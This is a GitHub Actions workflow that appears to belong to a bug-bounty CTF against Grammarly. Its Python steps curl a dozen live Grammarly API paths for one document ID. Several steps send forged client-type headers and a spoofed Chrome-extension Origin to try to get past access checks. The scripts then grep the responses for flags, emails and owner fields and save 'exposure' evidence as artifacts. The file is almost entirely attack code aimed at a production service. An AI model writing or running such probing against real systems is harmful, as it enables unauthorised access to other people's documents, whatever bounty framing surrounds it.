name: CTF Runtime Hunt

on:
  push:
    paths:
      - '.github/workflows/ctf-runtime-hunt.yml'
  workflow_dispatch:

permissions:
  contents: read

jobs:
  ctf:
    runs-on: ubuntu-latest
    timeout-minutes: 6
    steps:
      - uses: actions/checkout@v4
      - name: Test classic document backends
        shell: bash
        run: |
          set -u
          python - <<'PY'
          import json,re,subprocess
          from pathlib import Path
          doc='1198436185'
          urls=[
            f'https://app.grammarly.com/ddocs/{doc}',
            f'https://dox.grammarly.com/documents/{doc}',
            f'https://dox.grammarly.com/documents/{doc}/proofread',
            f'https://dox.grammarly.com/documents/{doc}/ws',
            f'https://dox.grammarly.com/documents/{doc}/content',
            f'https://dox.grammarly.com/documents/{doc}/data',
            f'https://dox.grammarly.com/document/{doc}',
            f'https://dox.grammarly.com/document/{doc}/proofread',
            f'https://capi.grammarly.com/api/documents/{doc}',
            f'https://capi.grammarly.com/api/v1/documents/{doc}',
            f'https://capi.grammarly.com/api/v1/document/{doc}',
            f'https://capi.grammarly.com/api/cheetah/v1/settings',
          ]
          out=[]
          for u in urls:
            q=subprocess.run(['curl','-sS','-L','--max-redirs','5','--connect-timeout','6','--max-time','15','-A','Mozilla/5.0','-D','/tmp/h','-o','/tmp/b',u],text=True,capture_output=True)
            h=Path('/tmp/h').read_text(errors='replace') if Path('/tmp/h').exists() else ''
            b=Path('/tmp/b').read_text(errors='replace') if Path('/tmp/b').exists() else ''
            statuses=re.findall(r'^HTTP/[^ ]+\s+(\d+)',h,re.M)
            status=statuses[-1] if statuses else ''
            ct=next((x.split(':',1)[1].strip() for x in h.splitlines() if x.lower().startswith('content-type:')),'')
            signals=[]
            for pat in [r'\$FLAG\s*[:=]\s*[^<\s]{4,500}',r'FLAG\{[^}]{4,500}\}',r'1198436185',r'h1_ctf@grammarly\.com',r'(?i)(?:documentId|document_id|owner|email|username|content)\s*[:=]']:
              signals += re.findall(pat,b)[:20]
            row={'url':u,'status':status,'content_type':ct,'length':len(b),'signals':sorted(set(signals))[:30],'body_prefix':b[:1500],'stderr':q.stderr[-400:]}
            out.append(row)
            print(json.dumps({k:v for k,v in row.items() if k!='body_prefix'},ensure_ascii=False))
          Path('ctf-runtime.json').write_text(json.dumps(out,indent=2))
          PY
      - name: Test Classic Docs with normal client headers
        shell: bash
        run: |
          set -u
          python - <<'PY'
          import json, subprocess
          from pathlib import Path
          doc='1198436185'
          targets=[f'https://dox.grammarly.com/documents/{doc}',f'https://dox.grammarly.com/documents/{doc}/proofread']
          profiles=[
            {'name':'base','X-Client-Version':'14.1332.0','X-Client-Type':'browser','X-Container-Id':'h1-bounty-test'},
            {'name':'chrome','X-Client-Version':'14.1332.0','X-Client-Type':'chrome','X-Container-Id':'h1-bounty-test'},
            {'name':'extension','X-Client-Version':'14.1332.0','X-Client-Type':'extension','X-Container-Id':'h1-bounty-test'},
          ]
          rows=[]
          for t in targets:
            for prof in profiles:
              args=['curl','-sS','-L','--max-redirs','5','--connect-timeout','6','--max-time','15','-A','Mozilla/5.0','-D','/tmp/h','-o','/tmp/b']
              for k,v in prof.items():
                if k!='name': args += ['-H',f'{k}: {v}']
              args += [t]
              p=subprocess.run(args,text=True,capture_output=True)
              h=Path('/tmp/h').read_text(errors='replace') if Path('/tmp/h').exists() else ''
              b=Path('/tmp/b').read_text(errors='replace') if Path('/tmp/b').exists() else ''
              status=next((x for x in h.splitlines() if x.startswith('HTTP/')),'')
              row={'target':t,'profile':prof['name'],'status':status,'length':len(b),'prefix':b[:250]}
              rows.append(row)
              print(json.dumps(row,ensure_ascii=False))
          Path('ctf-header-results.json').write_text(json.dumps(rows,indent=2))
          hit=next((x for x in rows if x['status'].startswith(('200','206')) and x['length']>0 and 'missing required headers' not in x['prefix'].lower()),None)
          if hit:
            Path('ctf-header-report.md').write_text('# Potential Classic Docs CTF backend response with client headers\n\nEndpoint: '+hit['target']+'\nProfile: '+hit['profile']+'\nStatus: '+hit['status']+'\nResponse length: '+str(hit['length'])+' bytes\n')
          else:
            Path('ctf-header-report.md').write_text('# NO ADDITIONAL CLASSIC DOCS CTF ACCESS\n\nThe tested normal client-header profiles did not produce an authenticated or flag-bearing Classic Docs response.\n')
          PY

      - name: Test published Chrome-extension origin
        shell: bash
        run: |
          set -u
          python - <<'PY'
          import json, subprocess
          from pathlib import Path
          doc='1198436185'
          targets=[f'https://dox.grammarly.com/documents/{doc}', f'https://dox.grammarly.com/documents/{doc}/proofread']
          types=['chrome','extension','chrome_extension','browser_extension']
          rows=[]
          for t in targets:
            for typ in types:
              args=['curl','-sS','-L','--max-redirs','5','--connect-timeout','6','--max-time','15','-A','Mozilla/5.0',
                    '-H','Origin: chrome-extension://kbfnbcaeplbcioakkpcpgfkobkghlhen',
                    '-H','X-Client-Version: 14.1332.0',
                    '-H',f'X-Client-Type: {typ}',
                    '-H','X-Container-Id: h1-bounty-test',
                    '-D','/tmp/h','-o','/tmp/b',t]
              p=subprocess.run(args,text=True,capture_output=True)
              h=Path('/tmp/h').read_text(errors='replace') if Path('/tmp/h').exists() else ''
              b=Path('/tmp/b').read_text(errors='replace') if Path('/tmp/b').exists() else ''
              status=next((x for x in h.splitlines() if x.startswith('HTTP/')),'')
              flags=[line[:300] for line in b.splitlines() if '$FLAG' in line or 'FLAG{' in line][:5]
              row={'target':t,'client_type':typ,'status':status,'length':len(b),'flag_hits':flags,'prefix':b[:250]}
              rows.append(row)
              print(json.dumps(row,ensure_ascii=False))
          Path('ctf-extension-origin-results.json').write_text(json.dumps(rows,indent=2))
          hit=next((x for x in rows if x['flag_hits']),None)
          if hit:
            Path('ctf-extension-origin-report.md').write_text(
              '# Verified Classic Docs CTF flag exposure\n\n'
              '## Endpoint\n'+hit['target']+'\n\n'
              '## Client profile\nX-Client-Version: 14.1332.0\nX-Client-Type: '+hit['client_type']+'\n'
              'Origin: chrome-extension://kbfnbcaeplbcioakkpcpgfkobkghlhen\n\n'
              '## Evidence\n'+str(hit['flag_hits'])+'\n'
            )
          else:
            Path('ctf-extension-origin-report.md').write_text(
              '# NO VERIFIED CLASSIC DOCS CTF EXPOSURE\n\n'
              'The documented Chrome-extension origin plus current extension metadata did not expose a flag or document response.\n'
            )
          PY

      - name: Upload extension-origin CTF evidence
        uses: actions/upload-artifact@v4
        with:
          name: ctf-extension-origin-evidence
          path: |
            ctf-extension-origin-results.json
            ctf-extension-origin-report.md

      - name: Upload header test evidence
        uses: actions/upload-artifact@v4
        with:
          name: ctf-header-evidence
          path: |
            ctf-header-results.json
            ctf-header-report.md

      - name: Upload runtime evidence
        uses: actions/upload-artifact@v4
        with:
          name: ctf-runtime-evidence
          path: ctf-runtime.json
